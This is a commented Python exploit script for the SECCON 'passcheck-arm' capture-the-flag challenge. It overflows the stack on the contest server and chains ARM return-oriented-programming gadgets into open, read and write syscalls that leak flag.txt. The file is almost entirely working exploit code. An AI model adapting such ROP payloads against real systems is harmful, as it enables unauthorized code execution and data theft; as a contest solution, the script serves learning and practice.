#!/usr/bin/env python
# -*- coding: UTF-8 -*-
#
# exploit for passcheck-arm
# note that the binary will not run due to use of a special emulator
#

from pwn import *

def strow(instr, owstr, offset):
	return instr[:offset] + owstr + instr[offset + len(owstr):]

r = remote('micro.pwn.seccon.jp', 10001)
print r.recvuntil("Input password: ")

# stack overflow reading password, we gain execution on the following instruction
# we are byte restricted on \n 0x0a and \r 0x0d
# .text:000042B0 7E 88 BD E8                 LDMFD           SP!, {R1-R6,R11,PC}

buff =  p32(1) # r1, offset 0
buff += p32(2) # r2, offset 4
buff += p32(3) # r3, offset 8
buff += p32(4) # r4, offset 0xc
buff += p32(5) # r5, offset 0x10
buff += p32(6) # r6, offset 0x14
buff += p32(11) # r11, offset 0x18

# can jump to this address to receive the string "OK. Read flag.txt" as a test of ROP accuracy
# .text:000042EC 18 00 9F E5                 LDR             R0, =aOk_ReadFlag_tx ; "OK. Read flag.txt"
# .text:000042F0 F0 FF FF EB                 BL              print_line

buff += p32(0) # pc, offset 0x1c -- 0x42ec will test the ROP alignment (this is overwritten later)

# syscall tables
# 3	sys_read	fs/read_write.c	unsigned int	char *	size_t	-	-
# 4	sys_write	fs/read_write.c	unsigned int	const char *	size_t	-	-
# 5	sys_open	fs/open.c	const char *	int	int	-	-

# we need to make 3 syscalls to open(), read(), and write()
# execution must be continued between syscalls, further we must gain control of r0 to hold the syscall number
# syscalls have the format of r0 = syscall number, r1 = arg 1, r2 = arg2, r3 = arg3

# using the gadget here will move r4 into r0 for the syscall
# .text:0000421C 04 00 A0 E1                 MOV             R0, R4
# .text:00004220 70 80 BD E8                 LDMFD           SP!, {R4-R6,PC}

# there is a function in the binary that just wraps a system call with svc 0xff; ret
# we can use the gadget here to call this function and return control
# .text:00004028 F9 FF FF EB                 BL              svc_wrapper
# .text:0000402C 00 80 BD E8                 LDMFD           SP!, {PC}

#
# open("flag.txt", 0)
#
buff = strow(buff, p32(0x421c), 0x1c) # replace initial pc to have r4 -> r0 and regain control 
buff = strow(buff, p32(5), 0xc) # set r4 (and therefor r0 after 1st rop) to be 5, system call of open
buff = strow(buff, p32(0x4355), 0) # set r1 to be pointer to filename, flag.txt is in the binary at 0x4355
buff = strow(buff, p32(0), 4) # set r2 to be 0 for O_RDONLY in open system call
buff += p32(4) # r4 after rop1, offset 0x20
buff += p32(5) # r5 after rop1, offset 0x24
buff += p32(6) # r6 after rop1, offset 0x28
buff += p32(0x4028) # execute the service wrapper, offset 0x2c

#
# read(fd, 0x1fff0104, 100)
#

# 0x1fff0100 is unused .data section of the binary
# we do the same routine again, regaining control of r1-6, r11, moving r4 -> r0, etc.
buff += p32(0x42b0) # return from service wrapper, offset 0x30

# the file descriptor here is randomized! we can hardcode an observerd value and brute force
# or try to rop to have the return from svc (stored where?) be in r1.
buff += p32(0x41) # r1, offset 0x34 -- FD
buff += p32(0x1fff0104) # r2, offset 0x38 -- pointer to buffer
buff += p32(100) # r3, offset 0x3c -- length to b read
buff += p32(3) # r4, offset 0x40 -- syscall number for read, r4-> r0
buff += p32(5) # r5, offset 0x44
buff += p32(6) # r6, offset 0x48
buff += p32(11) # r11, offset 0x4c
buff += p32(0x421c) # pc to rop to r4->r0, offset 0x50
buff += p32(4) # r4 after rop2, offset 0x54
buff += p32(5) # r5 after rop2, offset 0x58
buff += p32(6) # r6 after rop2, offset 0x5c
buff += p32(0x4028) # execute the service wapper, offset 0x60

#
# write(1, 0x1fff0104, 100)
#

# now we want to print the flag

buff += p32(0x42b0) # rop to regain control after read(), offset 0x64
buff += p32(1) # r1, offset 0x68 -- FD
buff += p32(0x1fff0104) # r2, offset 0x6c -- pointer to buffer
buff += p32(100) # r3, offset 0x70 -- length to write
buff += p32(4) # r4, offset 0x74 -- syscall number for read, r4-> r0
buff += p32(5) # r5, offset 0x78
buff += p32(6) # r6, offset 0x7c
buff += p32(11) # r11, offset 0x80
buff += p32(0x421c) # pc to rop to r4->r0, offset 0x84
buff += p32(4) # r4 after rop2, offset 0x88
buff += p32(5) # r5 after rop2, offset 0x8c
buff += p32(6) # r6 after rop2, offset 0x90
buff += p32(0x4028) # execute the service wapper, offset 0x94
buff += p32(0x42ec)


r.sendline(buff)
print r.recv(1024)
